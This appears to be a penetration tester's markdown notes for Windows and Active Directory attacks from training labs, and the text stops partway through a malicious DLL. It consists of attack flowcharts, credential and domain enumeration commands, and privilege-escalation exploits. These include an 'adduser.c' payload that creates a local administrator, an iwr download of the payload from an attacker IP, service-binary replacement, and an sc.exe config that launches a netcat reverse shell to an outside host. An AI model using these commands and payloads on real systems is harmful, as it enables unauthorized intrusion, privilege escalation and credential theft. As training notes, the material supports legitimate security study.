## Exploits Flowchart
I have...
- No domain account access
	- A list of usernames but an unknown password
		- [](Training%20Material/Windows.md#Password%20spraying|Password%20spraying)
		- [](Training%20Material/Windows.md#AS-REP%20Roasting|AS-REP%20roasting)
		- [](Training%20Material/Windows.md#Kerberoasting|Kerberoasting)
		- [](Training%20Material/Windows.md#^e594f0|Check%20credentials%20with%20CME)
- Domain account access
	- List of usernames but an unknown password
		- [](Training%20Material/Windows.md#Password%20spraying|Password%20spraying)
		- [](Training%20Material/Windows.md#AS-REP%20Roasting|AS-REP%20roasting)
		- [](Training%20Material/Windows.md#Kerberoasting|Kerberoasting)
	- [](Training%20Material/Windows.md#AS-REP%20Roasting|AS-REP%20roasting)
	- [](Training%20Material/Windows.md#Kerberoasting|Kerberoasting)
	- SeDebugPrivilege right (default given to admins)
		- [](Training%20Material/Windows.md#Dump%20cached%20logon%20hashes|Dump%20cached%20logon%20hashes)
		- [](Training%20Material/Windows.md#Dump%20cached%20Kerberos%20tickets|Dump%20cached%20Kerberos%20tickets)
	- Domain Admins / Enterprise Admins / Administrators / Domain Controllers membership
		- [](Training%20Material/Windows.md#DCSync%20Attack|DCSync%20attack)
	- Hash of a service account (they have an SPN)
		- [](Training%20Material/Windows.md#Silver%20Tickets|Silver%20Ticket)	
	 - Hash for the krbtgt account
		- [](Training%20Material/Windows.md#Golden%20Ticket|Golden%20Ticket)
	- Domain Admins membership
		- [](Training%20Material/Windows.md#DCSync%20Attack|DCSync%20attack)
		- [](Training%20Material/Windows.md#Shadow%20Copies|Shadow%20copy%20attack)
	- GenericAll or GenericWrite permissions on a user object
		- Disable Kerberos pre-authentication then [](Training%20Material/Windows.md#AS-REP%20Roasting|AS-REP%20roast)
		- Add an SPN then [](Training%20Material/Windows.md#Kerberoasting|Kerberoast)
## Lateral Movement Flowchart
I have a...
- Password & username
	- For user with Administrators membership on remote machine
		- [](Training%20Material/Windows.md#WMI%20(wmic.exe%20/%20PS%20WMI)|WMI)
		- [](Training%20Material/Windows.md#WinRM%20(winrs.exe%20/%20PS%20remoting)|WinRM)
		- [](Training%20Material/Windows.md#Evil-WinRM|Evil-WinRM)
		- $ADMIN share available & File and Printer Sharing enabled (both yes by default)
			- [](Training%20Material/Windows.md#psexec.exe|psexec.exe)
			- [](Training%20Material/Windows.md#impacket-wmiexec/psexec|impacket-wmiexec/psexec)
	- For user with Remote Management Users membership on remote machine
		- [](Training%20Material/Windows.md#WinRM%20(winrs.exe%20/%20PS%20remoting)|WinRM)
	- For user with Remote Desktop Users membership on remote machine & port 3389 open
		- [](Training%20Material/Windows.md#RDP|RDP)
- Hash & username
	- [](Training%20Material/Windows.md#Overpass%20the%20hash|Overpass%20the%20hash)
	- For user with Administrators membership on remote machine
		- $ADMIN share available & File and Printer Sharing enabled (both yes by default)
			- [](Training%20Material/Windows.md#psexec.exe|psexec.exe)
			- [](Training%20Material/Windows.md#impacket-wmiexec/psexec|impacket-wmiexec/psexec)
		- WinRM enabled on remote machine (port 5985 or 5986 open)
			- [](Training%20Material/Windows.md#Evil-WinRM|Evil-WinRM)
	- For user with Remote Desktop Users membership on remote machine & port 3389 open
		- [](Training%20Material/Windows.md#RDP|RDP)
- Cached TGS: [](Training%20Material/Windows.md#Pass%20the%20Ticket|Pass%20the%20Ticket)
- Saved credentials: [](Training%20Material/Windows.md#Runas|Runas)
- Session with administrator privileges: [](Training%20Material/Windows.md#DCOM%20(Distributed%20Component%20Object%20Model)|DCOM)
## Enumeration

>[!code]- User and group information
>Information about the current user
>```powershell
>C:\Users\dave> whoami /all
>C:\htb> echo %USERNAME%
>```
>User rights (more may be listed within an elevated cmd/PS session); enable a privilege with [this script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1):
>```powershell
>PS C:\htb> whoami /priv
>```
>Other users and groups
>```powershell
>PS C:\Users\dave> Get-LocalUser
>C:\htb> net user
>
>PS C:\Users\dave> Get-LocalGroup
>C:\htb> net localgroup
>```
>Members of a group:
>```powershell
>PS C:\Users\dave> Get-LocalGroupMember adminteam
>C:\htb> net localgroup adminteam
>```
>Logged in users:
>```powershell
>C:\htb> query user
>```
>Password policy:
>```powershell
>C:\htb> net accounts
>```
>Powerful groups:
>```powershell
>Default Administrators
>Server Operators
>Server Operators
>Backup Operators
>Print Operators
>Hyper-V Administrators
>Account Operators
>Remote Desktop Users
>Remote Management Users
>Group Policy Creator Owners
>Schema Admins
>DNS Admins
>```
>Powerful Privileges/Rights:
>```powershell
>SeNetworkLogonRight
>SeRemoteInteractiveLogonRight
>SeBackupPrivileges
>SeSecurityPrivilege
>SeTakeOwnershipPrivilege
>SeDebugPrivilege
>SeImpersonatePrivilege
>SeLoadDriverPrivilege
>SeRestorePrivilege
>SeAssignPrimaryTokenPrivilege
>SeManageVolumePrivilege
>```

>[!code]- Users & groups
>###### Users
>```powershell
># net.exe
>C:\Users\stephanie>net user /domain
>C:\Users\stephanie>net user jeffadmin /domain
>
># PowerView
>PS C:\Tools> Get-NetUser
>PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon
>PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
>
># Enum4linux
>enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
>
># rpcclient
>rpcclient -U "" -N 172.16.5.5
>rpcclient $> enumdomusers
>
># Crackmapexec
>crackmapexec smb 172.16.5.5 --users
>crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
>crackmapexec smb 192.168.222.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' --users | grep -oP '(?<=\\)[^\s]+' > usernames.txt
>
># LDAP
>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
>
>./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
>
># PS ActiveDirectory Module
>PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
>
># SharpView
>PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
>```
>###### Groups
>```powershell
>C:\Users\stephanie>net group /domain PS
>C:\Tools> net group "Sales Department" /domain
>
># PowerView
>PS C:\Tools> Get-NetGroup | select cn
>PS C:\Tools> Get-NetGroup "Sales Department" | select member
>PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
>
># CrackMapExec
>bubbleman@htb\[htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
>
># PS ActiveDirectory Module
>PS C:\htb> Get-ADGroup -Filter * | select name
>PS C:\htb> Get-ADGroup -Identity "Backup Operators"  # group info
>PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"  # group members
>```
>###### Logged on Users
>```powershell
># PowerView
># Warning: this command might not work on machines running Windows Server 2019 build 1809 or Windows 10 build 1709. It may also not work if the current user doesn't have the correct permissions. It may give a result, but that result might be false.
>PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
>
># PsLoggedOn.exe
># Warning: this tool relies on the _Remote Registry_ service to work, but that service has not been enabled by default on Windows since Windows 8. The tool may also show our current user as logged on on other machines, because the tool requires to log on temporarily to work.
>PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04
>
># CrackMapExec
>bubbleman@htb\[htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
>
># cmd.exe
>PS C:\htb> qwinsta
>```
>###### Where current user is Admin
>```powershell
># PowerView
>PS C:\Tools> Find-LocalAdminAccess
>```

>[!code]- (AD) Brute force users
>###### Kerbrute
>```powershell
>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
>
># Wordlists
>Small - /usr/share/wordlists/metasploit/namelist.txt
>Medium - /usr/share/seclists/Usernames/Names/names.txt
>Large - /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
>
># Output valid usernames to a text file
>kerbrute userenum -d nagoya-industries.com --dc 192.168.182.21 ~/boxes/pg-nagoya/possible-ad-usernames.txt | grep "VALID USERNAME" | sed 's/.*VALID USERNAME:\s*//' | cut -d'@' -f1 > usernames.txt
>```
>

>[!code]- Machine information
>OS and architecture (and whether the machine has been patched recently):
>```powershell
>PS C:\Users\dave> systeminfo
>```
>If `systeminfo` doesn't display hotfixes (KBs), try WMI:
>```powershell
>C:\htb> wmic qfe
>PS C:\hbt> Get-HotFix | ft -AutoSize
>```

>[!code]- Network information
>Network interfaces:
>```powershell
>PS C:\Users\dave> ipconfig /all
>```
>Routing table:
>```powershell
>PS C:\Users\dave> route print
>```
>Active network connections (look for processes that only face internally):
>```powershell
>PS C:\Users\dave> netstat -ano
>```
>ARP table:
>```powershell
>PS C:\htb> arp -a
>```
>Port scan:
>```powershell
>PS C:\Users\student> 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $\_)) "TCP port $_ is open"} 2>$null
>```
>Test one port (eg SMB):
>Port scan for an SMB server:
>```powershell
>PS C:\Users\student> Test-NetConnection -Port 445 192.168.50.151
>```

>[!code]- Installation applications
>32-bit applications:
>```powershell
>PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
>```
>64-bit applications:
>```powershell
>PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
>```
>32- and 64-bit applications:
>```powershell
>dir C:\Program Files
>```
>WMI:
>```powershell
>C:\htb> wmic product get name
>PS C:\htb> Get-WmiObject -Class Wind32_Product | select Name, Version
>```

>[!code]- Permissions on a service (stop/start?)
>###### Get-ServiceAcl
>```powershell
>"IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access
>```

>[!code]- Running processes
>Running processes:
>```powershell
>PS C:\Users\dave> Get-Process
>C:\htb> tasklist /svc
>```
>Active network connections:
>```powershell
>PS C:\htb> netstat -ano
>```

>[!code]- Named pipes
>- Processes can communicate with each other using named pipes
>- Pipes are essentially files stored in memory that get cleared out after being read
>- Every active connection to a named pipe server results in the creation of a new named pipe
>
>Use the Sysinternals tool [Pipelist](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist) to enumerate instances of names pipes.
>
>```powershell
>C:\htb> pipelist.exe /accepteula
>PS C:\htb>  gci \\.\pipe\
>```

>[!code]- File permissions
>We can use [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) to enumerate permissions.
>
>Review permissions on the LSASS named pipe (a file in memory):
>```powershell
>C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v
>```
>Review all named pipes:
>```powershell
>.\accesschk.exe /accepteula \pipe\
>```
>Review all named pipes that allow write access:
>```powershell
>accesschk.exe -w \pipe\* -v
>```

>[!code]- Search files or folders
>###### File extension is
>```powershell
>PS C:\Users\dave> gci "C:\" -Include *.kdbx,*.txt -File -Recurse -ErrorAction SilentlyContinue
>```
>###### Folder name contains
>- `-force` includes hidden files/folders
>```powershell
>PS C:\> gci "C:\" -recurse -force -erroraction silentlycontinue | where {$_.name -like "*transcript*"}
>```

>[!code]- Command line history
>###### PS history:
>```powershell
>PS C:\Users\dave> Get-History
>```
>###### PSReadLine
>```powershell
># Get the filepath for the PSReadLine history file
>PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
>
># Output the file contents
>PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
>```
>###### PowerShell transcript-related files/folders
>```powershell
>gci "C:\" -recurse -force -erroraction silentlycontinue | where {$_.name -like "*transcript*"}
>```

>[!code]- Environmental variables
>List them:
>```powershell
>set
>dir env:
>```

>[!code]- Saved credentials **cmdkey /list**
>List any saved credentials:
>```powershell
>C:\PrivEsc>cmdkey /list
>```
>Use a saved credential to run an executable:
>```powershell
>C:\PrivEsc>runas /savecred /user:admin C:\PrivEsc\reverse.exe
>```
>

>[!code]- 'Always Install Elevated' enabled?
>###### Check status (if 0x1 then enabled)
>```powershell
>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
>```

>[!code]- Check if credentials work
>###### CrackMapExec
>```powershell
>crackmapexec smb 10.10.x.142 -u celia.almeda -p 7k8XHk3dMtmpnC7
>```

>[!code]- Enumerate object permissions
>###### PowerView
>Enumerate all ACEs for `offsec` user object and auto resolve SIDs
>```powershell
>PS C:\tools> Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
>```

>[!code]- Antivirus settings
>[AppLocker](https://learn.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps)policy (determines what binaries and file types can run):
>```powershell
>PS C:\> Get-AppLockerPolicy [-Local | -Domain | -Effective]
>
>PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
>
># Test an file against Applocker policy:
>PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
>```
>
>Windows Defender status:
>```powershell
># PowerShell
>PS C:\htb> Get-MpComputerStatus
># cmd.exe
>C:\htb> sc query windefend
>```

>[!code]- PowerShell Constrained Language Mode
>[Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows and PowerShell classes.
>###### PowerShell
>```powershell
>PS C:\htb> $ExecutionContext.SessionState.LanguageMode  #
>```

>[!code]- LAPS (Local Administrator Password Solution)
>The Microsoft Local Administrator Password Solution (LAPS) is used to randomise and rotate local administrator passwords in attempt to prevent lateral movement.
>
>The [LAPSToolkit aids](https://github.com/leoloobeek/LAPSToolkit) enumeration.
>```powershell
># Find groups that contain users who can read LAPS passwords
>PS C:\htb> Find-LAPSDelegatedGroups
>
># Check the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights". Users with this right can read LAPS passwords and may be less protected than users in delegated groups.
>PS C:\htb> Find-AdmPwdExtendedRights
>
># Find LAPS-enabled passwords
>PS C:\htb> Get-LAPSComputers
>```

>[!code]- Host Discovery
>###### Wireshark
>```powershell
># filters
>arp
>mdns
>```
>###### pktmon.exe ([LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/Pktmon/)- installed by default on Windows 10 onwards)
>```
>pktmon.exe start --etw
>pktmon.exe stop
>```
>###### Responder
>```powershell
># -A passively listen (and don't send any poisoned packets)
>sudo responder -I ens224 -A
>```
>###### tcpdump
>```powershell
>sudo tcpdump -i ens224
>```
>###### fping
>```powershell
># -a show targets that are alive
># -s print stats at the end of the scan
># -g generate a target list from the CIDR network
># -q to not show per-target results
>fping -asgq 172.16.5.0/24
>```

>[!code]- Domain Info / password policy
>###### Domain
>```powershell
># PowerShell
>PS C:\Tools> Get-NetDomain
>
># PS ActiveDirectory Module
>PS C:\htb> Get-ADDomain
>```
>###### Domain Trusts
>```powershell
># PS ActiveDirectory Module
>PS C:\htb> Get-ADTrust -Filter *
>
># PowerView
>PS C:\htb> Get-DomainTrustMapping
>```
>###### Password policy
>```powershell
># net.exe
># Lockout threshold = number of incorrect attempts to lock the account
># Lockout duration = number of minutes the account will be locked for
># Observation window = number of minutes after which number of attempts resets
>PS C:\Users\jeff> net accounts
>
># PowerView
>Get-DomainPolicy
>
>net use \\DC01\ipc$ "" /u:""
>net use \\DC01\ipc$ "" /u:guest
>net use \\DC01\ipc$ "password" /u:guest
>
># CME
>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
>
># RPC
>rpcclient -U "" -N 172.16.5.5
>rpcclient $> querydominfo
>rpcclient $> getdompwinfo
>
># Enum4Linux (combines nmblookup, rpcclient and smbclient)
>enum4linux -P 172.16.5.5
>```
>###### Ldapsearch
>```powershell
># PwdProperties set/unset = 1/0
>ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
>```

>[!code]- Domain Computers / Shares
>###### Domain Computers
>```powershell
># PowerView
>PS C:\Tools> Get-NetComputer
>PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname
>PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
>```
>###### Domain Shares
>```powershell
># SYSVOL share
># There may be GPP encrypted passwords in there (easily decrypted)
>PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
>PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
>
># PowerView
># "-CheckShareAccess" only displays those that are available to our current user
>PS C:\Tools> Find-DomainShare [-CheckShareAccess]
>
># CME
>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
>```

>[!code]- Vulnerable accounts (AS-REP roastable & pre-auth disabled accounts)
>AS-REP roastable accounts:
>
>PowerView:
>```powershell
>PS C:\Tools> Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
>```
>Impacket:
>- **-request** to obtain the NTLM hash of the account
>- **-outputfile** to write the obtained hash to a file
>```bash
>kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70 [-request] [-outputfile hashes.asreproast] corp.com/pete
>```
>___
>
>Kerberos pre-authentication disabled accounts:
>```powershell
>PS C:\Tools> Get-DomainUser -KerberosPreuthNotRequired
>```

>[!code]- SPNs
>###### Find accounts with SPNs
>```powershell
># setspn.exe
>c:\Tools> setspn -L iis_service
>c:\Tools> setspn -T corp -Q */*   # Extract all SPNs
>
># PowerShell
>PS C:\Tools> get-adobject | Where-Object {$\_.serviceprincipalname -ne $null -and $\_.distinguishedname -like "*CN=Users*" -and $\_.cn -ne "krbtgt"}
>
>PS C:\Tools> get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
>
># PowerView
>PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname
>PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
>```
>###### SPN to IP address
>```powershell
>PS C:\Tools\> nslookup.exe web04.corp.com
>```

>[!code]- Convert an SID to a name
>###### PowerView
>```powershell
># one SID
>PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
>
># multiple SIDs
>PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
>```

>[!code]- BloodHound
>###### Collection
>```powershell
># On the victim - PS1
>PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
>
># On the victim - exe
>PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
>
># From Kali
>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all --zip
>```
>###### Parsing
>```bash
>kali@kali:~$ sudo neo4j start
>kali@kali:~$ bloodhound
>```

>[!code]- DCSync rights
>###### dsacls
>```powershell
>dsacls "DC=egotistical-bank,dc=local" | findstr /i "svc_loanmgr"
>```
>---
>###### PowerShell
>```powershell
>Import-Module ActiveDirectory
>
>(Get-Acl -Path "AD:DC=egotistical-bank,DC=local").Access | Where-Object { $_.IdentityReference -like "*EGOTISTICALBANK\svc_loanmgr*"}
>```
>###### PowerView
>```powershell
># Get the user's SID
>PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
>
># Check that ACEs for the domain for any relating to our user
>PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
>PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
>```
>Then lookout for either an object with ([MS docs](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=net-8.0&viewFallbackFrom=net-5.0)):
>- ActiveDirectoryRights = ExtendedRight
>- ObjectType =
>	- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes-All)
>	- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes)
>	- `89e95b76-444d-4c62-991a-0facbeda640c` (DS-Replication-Get-Changes-In-Filtered-Set)

>[!code]- Cached GPP passwords
>###### Search
>```powershell
># Internally
>C:\ProgramData\Microsoft\Group Policy\history
>
>C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
>
># Externally (on SMB share)
>Usually in Policies folder
>crackmapexec smb -L | grep gpp
>
># Example result
>cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
>```
>###### Decrypt
>```powershell
>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
>```
>

>[!code]- GPOs
>###### Enumerate GPO names
>```powershell
># PowerView
>PS C:\htb> Get-DomainGPO |select displayname
># Built-in
>PS C:\htb> Get-GPO -All | Select DisplayName
>```
>###### Enumerate GPO rights
>```powershell
>PS C:\htb> $sid=Convert-NameToSid "Domain Users"
># PowerView
>PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
>```
>###### Abuse rights on a GPO

>[!code]- ACLs
>###### [Guides](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) on how to exploit certain permissions on certain objects
>###### PowerView
>```powershell
># All
>PS C:\htb> Find-InterestingDomainAcl
>
># ----- Targeting a user
>PS C:\htb> $sid = Convert-NameToSid wley
>
># ResolveGUIDs turns coded ObjectAceType GUIDs into human readable values
>PS C:\htb> Get-DomainObjectACL [-ResolveGUIDs] -Identity * | ? {$_.SecurityIdentifier -eq $sid}
>
># Get the raw ObjectAceType GUIDs
>PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
># -----
>```
>###### Get-ACL & Get-ADUser
>```powershell
># Create a list of domain user
>PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
>
># For loop to see what permissions our current user has over the list of domain users
>PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
>
># Resolve the coded GUID into a human readable format
>PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
>PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
>```

>[!code]- PowerUp.ps1
>###### Check everything
>```powershell
>Invoke-AllChecks
>```

>[!code]- Files
>###### Owner
>```powershell
>Get-ChildItem -Path .\ | Select-Object FullName, @{Name="Owner"; Expression={(Get-Acl $_.FullName).Owner}} | Format-Table -AutoSize
>```
## Exploits
#### Hijacking Service Binaries

>[!info]- Info - Services and their binary files
>Each Windows service has an associated binary file, which are executed when the service is started or transitioned into a running state.

>[!exploit]- Exploit - Insecure permissions on the service binary file
>If a service binary file has insecure permissions, we might be able to replace the file with a malicious one. This file is then executed when the service is restarted or the machine is rebooted. Upon restart, the malicious binary is executed with the privileges of the service, eg *LocalSystem*.

>[!code]- List the running services
>List the running services and the paths to their binaries:
>```powershell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select
>Name,State,PathName | Where-Object {$_.State -like 'Running'}
>```
>This could also be done with:
>1. services.msc
>2. Get-Service cmdlet

>[!code]- Find a service binary with write permissions granted
>An example with no write permissions:
>```powershell
># dave only has Read and Execute (RX) rights on httpd.exe
>PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe" C:\xampp\apache\bin\httpd.exe
>	BUILTIN\Administrators:(F)
>	NT AUTHORITY\SYSTEM:(F)
>	BUILTIN\Users:(RX)
>	NT AUTHORITY\Authenticated Users:(RX)
>
>Successfully processed 1 files; Failed processing 0 files
>
>An example with full permissions (ie including write):
>PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe" C:\xampp\mysql\bin\mysqld.exe
>	NT AUTHORITY\SYSTEM:(F)
>	BUILTIN\Administrators:(F)
>	BUILTIN\Users:(F)
>
>Successfully processed 1 files; Failed processing 0 files
>```
>Other options include the PowerShell Cmdlet *Get-ACL*.

>[!code]- Create a malicious binary
>Create a malicious binary.
>
>The `adduser.c` binary will create a new *dave2* user and add them to the local Administrators group using the *system* function:
>>[!code]- adduser.c
>>```c
>>#include <stdlib.h>
>>
>>int main ()
>>{  
>>	int i;
>>	i = system ("net user dave2 password123! /add");  
>>	i = system ("net localgroup administrators dave2 /add");
>>	return 0;
>>}
>>```
>
>___
>Compile it.
>
>The target machine is 64-bit so we'll cross-compile the C code to a 64-bit application with **x86_64-w64-mingw32-gcc**.
>- **-o** to specify the name of the compiled executable
>```bash
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
>```

>[!code]- Transfer the malicious binary to the target machine.
>Transfer it ([](Transfer%20Files.md#Transfer%20to%20Windows|other%20options%20here)):
>```powershell
>PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
>```
>Move it to replace the original binary:
>```powershell
>PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe  
>PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
>```

>[!code]- Restart the service or reboot the machine
>>[!warning]- Limitation - restarting the service requires suitable permissions
>
>Check if the service Startup Type is set to "Automatic".
>(If so it should restart upon a reboot of the machine.)
>
>```powershell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$\_.Name -like 'mysql'}
>
>Name StartMode
>---- ---------
>mysql Auto
>```
>
>Reboot the machine.
>- **/r** to reboot instead of shutdown
>- **/t 0** to reboot in zero seconds
>```powershell
>PS C:\Users\dave> shutdown /r /t 0
>```

>[!code]- Automate the exploit with PowerUp
>Transfer to the Windows machine ([](Transfer%20Files.md#Transfer%20to%20Windows|other%20methods%20here)):
>```powershell
>PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
>```
>Run PowerUp:
>```powershell
>PS C:\Users\dave> powershell -ep bypass
>PS C:\Users\dave> . .\PowerUp.ps1
>PS C:\Users\dave> Get-ModifiableServiceFile
>```
#### Change service binary path

>[!code]- See if have necessary rights (ChangeConfig, Start, Stop)
>###### Get-ServiceAcl
>```powershell
>"IObitUnSvr" | Get-ServiceAcl | select -ExpandProperty Access
>```

>[!code]- Change service binary path
>###### Edit service config
>```powershell
>sc.exe config IObitUnSvr binPath="cmd.exe /c C:\Users\dharding\Documents\nc.exe -e cmd.exe 10.10.X.Y 1234"
>```
>##### Restart service
>```powershell
>sc.exe stop
>sc.exe start
>```
#### Hijacking Service DLLs

>[!info]- Info - The search order for a DLL
>The search order is defined by Microsoft and determines what to inspect first when searching for DLLs. The following list shows the ***standard*** search order:
>1. The directory from which the application loaded.
>2. The system directory.  
>3. The 16-bit system directory.  
>4. The Windows directory.
>5. The current directory.  
>6. The directories that are listed in the PATH environment variable.
>
>The ***safe search*** order causes the _current directory_ to be searched at position 2.

>[!exploit]- Exploit - A binary attempts to load a DLL that doesn't exist
>A binary might attempt to load a DLL that doesn't exist on the system. We can try placing a malicious DLL in a path of the DLL search order so it executes when then binary is started.
>
>We need to find all DLLs loaded by a target binary (service) as well as detect missing ones. Once done we could either:
>1. replace one with our own malicious DLL if we have write permissions
>2. provide our own malicious DLL if one is missing

>[!code]- Find a service binary using vulnerable DLLs
>List the running services and the paths to their binaries:
>```powershell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select
>Name,State,PathName | Where-Object {$_.State -like 'Running'}
>```
>This could also be done with:
>1. services.msc
>2. Get-Service cmdlet

>[!code]- Search for a writeable or missing DLL for the service
>Either:
>1. Via the process monitor (requires GUI access and admin privileges)
>2. Via copying the target service binary to our Windows machine, installing the corresponding service on it, then use the Process Monitor
>___
>
>Via the process monitor.
>
>![Pasted image 20240508043821](Pasted%20image%2020240508043821.png)
>
We might need to restart the service to get any results in Process Monitor:
>```powershell
>PS C:\Users\steve> Restart-Service BetaService
>```
>
>>[!success]- We find a DLL (**myDLL**) that cannot be found and is searched for in a location we have access to (ie. the home directory of Steve).

>[!code]- Create a malicious DLL to replace the original one
>Create it:
>(This will create a new user and add them to the administrators group).
>>[!code]- myDLL.cpp
>>```cpp
>>#include <stdlib.h>
>>#include <windows.h>
>>
>>BOOL APIENTRY DllMain(  
>>HANDLE hModule,// Handle to DLL module  
